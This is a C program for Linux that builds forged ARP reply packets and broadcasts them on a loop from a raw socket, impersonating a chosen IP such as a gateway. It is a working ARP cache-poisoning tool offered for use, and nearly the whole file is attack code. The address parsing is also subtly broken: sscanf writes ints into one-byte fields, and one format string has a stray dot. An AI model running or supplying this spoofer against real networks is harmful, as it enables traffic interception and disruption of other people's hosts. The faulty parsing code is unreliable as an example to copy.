#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>

#define PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)

int main(int argc, char ** argv)
{
   int sock;
   char packet[PACKET_LEN];
   struct sockaddr_ll device;
   struct ether_header * eth = (struct ether_header *) packet;
   struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
   //argc
   if (argc < 4) 
   {
      printf("Usage: ./sendarp <interface> <source ip address(maybe gateway)> <target ip address>");
    exit(1);
   }
   //Socket open
   sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
   if (sock < 0)
   {
     perror("socket");
     exit(1);
   }
   //get my interface mac address
   struct ifreq req;
   memset(&req,0,sizeof(req));
   strncpy(req.ifr_name,argv[1],IF_NAMESIZE-1);
   if(ioctl(sock,SIOCGIFHWADDR,&req) < 0)
   {
	   perror("ioctl");
	   exit(1);
   }
   int i;
   for(i=0;i<6;i++)
   {
	   arp->arp_sha[i] = req.ifr_hwaddr.sa_data[i];
   }
   //Source Protocol Address : ARP Packet
   sscanf(argv[2], "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
                           (int *) &arp->arp_spa[1],
                           (int *) &arp->arp_spa[2],
                           (int *) &arp->arp_spa[3]);
   //Target Protocol Address : ARP Packet
   sscanf(argv[3], "%d.%d.%d.%d.", (int *) &arp->arp_tpa[0],
		   	(int *) &arp->arp_tpa[1],
			(int *) &arp->arp_tpa[2],
			(int *) &arp->arp_tpa[3]);
   //Ethernet Packet
   memset(eth->ether_dhost, 0xff , ETH_ALEN); //destination address
   memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN); //source address
   eth->ether_type = htons(ETH_P_ARP);    //type
   //ARP Packet
   arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);  //Format of hardware address
   arp->ea_hdr.ar_pro = htons(ETH_P_IP);   //Format of protocol address.
   arp->ea_hdr.ar_hln = ETH_ALEN;    //Length of hardware address.
   arp->ea_hdr.ar_pln = 4;      //Length of protocol address.
   arp->ea_hdr.ar_op = htons(ARPOP_REPLY);  //ARP operation : REPLY
   memset(arp->arp_tha, 0xff, ETH_ALEN);   //Target hardware address.
   //Device information
   memset(&device, 0, sizeof(device));
   device.sll_ifindex = if_nametoindex(argv[1]);  //Interface number 
   device.sll_family = AF_PACKET;     
   memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN); //Physical layer address
   device.sll_halen = htons(ETH_ALEN);    //Length of address
   //Send ARP packet
   printf("Press Ctrl+C to stop \n");
   while (1) 
   {
     printf("send to %s on %s : %s\n",argv[3], argv[2], argv[1]);
     sendto(sock, packet, PACKET_LEN, 0, (struct sockaddr *) &device, sizeof(device));
     sleep(2);
   }
   return 0;
}

